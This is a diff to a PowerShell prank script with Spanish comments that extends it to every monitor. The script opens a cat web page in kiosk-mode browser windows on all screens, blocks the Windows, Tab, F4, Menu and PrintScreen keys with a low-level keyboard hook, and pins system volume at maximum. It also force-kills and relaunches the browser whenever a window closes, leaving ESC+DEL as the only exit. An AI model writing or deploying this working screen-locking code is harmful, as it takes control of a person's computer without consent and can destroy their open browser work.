@@ -1,7 +1,7 @@
 <#
-  run.ps1 - Gatitos (https://gatitos-eight.vercel.app)
-  Única salida: ESC + DEL juntos
-  Reopen casi instantáneo + bloqueo de teclas
+  run.ps1 - Gatitos en TODAS las pantallas
+  Única salida: ESC + DEL
+  Reopen casi instantáneo
 #>
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -9,24 +9,21 @@ $ProgressPreference    = 'SilentlyContinue'
 
 $pageUrl = 'https://gatitos-eight.vercel.app'
 $titulo  = 'Gatitos'
-$perfil  = Join-Path $env:TEMP 'venice_kiosk'
+$basePerfil = Join-Path $env:TEMP 'venice_kiosk'
 
-# ---------------- Bloqueo de teclas + detección ESC+DEL ----------------
+# ---------------- Bloqueo de teclas + ESC+DEL ----------------
 Add-Type -TypeDefinition @'
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Threading;
 
 public static class KeyBlocker {
   private const int WH_KEYBOARD_LL = 13;
   private const int WM_KEYDOWN = 0x0100;
   private const int WM_SYSKEYDOWN = 0x0104;
-
   private static LowLevelKeyboardProc _proc = HookCallback;
   private static IntPtr _hookID = IntPtr.Zero;
 
-  // Para detectar ESC + DEL
   public static long lastEsc = 0;
   public static long lastDel = 0;
   public static bool shouldExit = false;
@@ -48,7 +45,6 @@ public static class KeyBlocker {
       int vk = Marshal.ReadInt32(lParam);
       long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
 
-      // Detectar ESC + DEL (margen 700ms)
       if (vk == 0x1B) { // ESC
         lastEsc = now;
         if (now - lastDel < 700) shouldExit = true;
@@ -58,14 +54,9 @@ public static class KeyBlocker {
         if (now - lastEsc < 700) shouldExit = true;
       }
 
-      // Bloquear teclas peligrosas (excepto ESC y DEL para poder detectarlos)
-      // Win, Alt+F4, Tab, Ctrl+Esc, etc.
-      if (vk == 0x5B || vk == 0x5C ||   // Left/Right Windows
-          vk == 0x73 ||                 // F4
-          vk == 0x09 ||                 // Tab
-          vk == 0x5D ||                 // Menu key
-          vk == 0x2C) {                 // PrintScreen
-        return (IntPtr)1; // bloquear
+      // Bloquear teclas peligrosas
+      if (vk == 0x5B || vk == 0x5C || vk == 0x73 || vk == 0x09 || vk == 0x5D || vk == 0x2C) {
+        return (IntPtr)1;
       }
     }
     return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -115,6 +106,10 @@ public static class Vol {
 }
 '@
 
+# ---------------- Obtener todas las pantallas ----------------
+Add-Type -AssemblyName System.Windows.Forms
+$screens = [System.Windows.Forms.Screen]::AllScreens
+
 # ---------------- Navegador ----------------
 function Get-Nav {
   $c = @(
@@ -132,50 +127,64 @@ $nav = Get-Nav
 if (-not $nav) { Write-Host "No se encontró Edge ni Chrome"; exit }
 $procName = [IO.Path]::GetFileNameWithoutExtension($nav)
 
-$flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
-         "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
-         "--autoplay-policy=no-user-gesture-required --disable-infobars " +
-         "--disable-features=Translate,msEdgeWelcomePage,EdgeCollections,msEdgeSidebarV2"
-if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }
+# Guardar los PIDs de cada monitor
+$script:pids = @{}
 
-$script:pidNav = 0
-
-function Lanzar {
+function LanzarEnTodas {
+  # Cerrar instancias anteriores
   Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-  Start-Sleep -Milliseconds 120
-  $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
-  if ($p) { $script:pidNav = $p.Id }
+  Start-Sleep -Milliseconds 200
+  $script:pids = @{}
+
+  $i = 0
+  foreach ($screen in $screens) {
+    $i++
+    $perfil = "$basePerfil`_$i"
+    $x = $screen.Bounds.X
+    $y = $screen.Bounds.Y
+    $w = $screen.Bounds.Width
+    $h = $screen.Bounds.Height
+
+    $flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
+             "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
+             "--autoplay-policy=no-user-gesture-required --disable-infobars " +
+             "--window-position=$x,$y --window-size=$w,$h " +
+             "--disable-features=Translate,msEdgeWelcomePage,EdgeCollections,msEdgeSidebarV2"
+
+    if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }
+
+    $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
+    if ($p) { $script:pids[$i] = $p.Id }
+  }
 }
 
 # Iniciar
 [KeyBlocker]::Start()
-Lanzar
-Start-Sleep -Milliseconds 700
+LanzarEnTodas
+Start-Sleep -Milliseconds 900
 
 try {
   while ($true) {
-    # ¿Se pidió salir con ESC + DEL?
-    if ([KeyBlocker]::shouldExit) {
-      break
-    }
+    if ([KeyBlocker]::shouldExit) { break }
 
     [Vol]::Set(1.0)
 
-    $alive = $false
+    # Contar cuántas ventanas del navegador siguen vivas
+    $vivos = 0
     $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
     foreach ($p in $procs) {
-      if ($p.Id -eq $script:pidNav -or $p.MainWindowTitle -like "*$titulo*") {
-        $alive = $true
-        break
+      if ($script:pids.Values -contains $p.Id -or $p.MainWindowTitle -like "*$titulo*") {
+        $vivos++
       }
     }
 
-    if (-not $alive) {
-      Lanzar
-      Start-Sleep -Milliseconds 250
+    # Si faltan pantallas → relanzar todas
+    if ($vivos -lt $screens.Count) {
+      LanzarEnTodas
+      Start-Sleep -Milliseconds 400
     }
 
-    Start-Sleep -Milliseconds 70
+    Start-Sleep -Milliseconds 80
   }
 }
 finally {
